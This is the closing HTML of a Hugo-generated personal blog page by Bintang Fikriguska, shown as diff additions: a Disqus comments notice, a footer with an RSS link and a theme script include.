+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+            </div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>2020</span>
+	    <span>Indonesia</span>
+            
+                <span><a href="https://fikriguska.github.io">Bintang Fikriguska</a></span>
+            
+            
+            <span> <a href="https://fikriguska.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://fikriguska.github.io/bundle.min.71be052e49740d65a77749a66c7e41b2f934c67fe08f37bf036d77cf7c34c90c83122f356c5fe8502d77a613eae1e3d900920dea1b5503167036da04f2798f19.js" integrity="sha512-cb4FLkl0DWWnd0mmbH5Bsvk0xn/gjze/A213z3w0yQyDEi81bF/oUC13phPq4ePZAJIN6htVAxZwNtoE8nmPGQ=="></script>
+
+
+
+    </body>
+</html>
